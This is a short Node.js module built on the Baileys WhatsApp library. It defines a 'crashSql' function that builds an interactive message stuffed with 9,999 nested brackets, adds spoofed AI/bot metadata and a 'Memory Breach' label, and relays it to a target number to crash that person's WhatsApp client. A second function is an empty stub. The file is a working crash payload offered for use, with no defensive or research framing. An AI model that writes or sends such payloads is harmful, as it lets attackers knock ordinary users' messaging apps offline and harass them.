const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const crypto = require('crypto');
const ImgCrL = fs.readFileSync('./ImgCrL.jpg')

async function carousels2(client, isTarget, fJids) {
    //atur sendiri kiNk
}

async function crashSql(client, targetJid) {
  const bracketOverload = "[".repeat(9999) + "]";

  const msg = generateWAMessageFromContent(targetJid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 3,
            is_ai_message: true,
            should_show_system_message: true,
            ai_message_type: "nested_crash",
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𝓒яครђ 𝓟г๏Շ๏ς๏l เภןєςՇє๔",
            hasMediaAttachment: false
          },
          body: {
            text: "WhatsApp Memory Breach Initiated"
          },
          nativeFlowMessage: {
            messageParamsJson: bracketOverload
          }
        }
      }
    }
  }, {});

  await client.relayMessage(targetJid, msg.message, {
    messageId: msg.key.id,
    additionalNodes: [
      {
        tag: "bot",
        attrs: { biz_bot: "1" }
      }
    ]
  });

  console.log("crashBracketBomb dikirim ke", targetJid);
}

module.exports = { crashSql, carousels2 }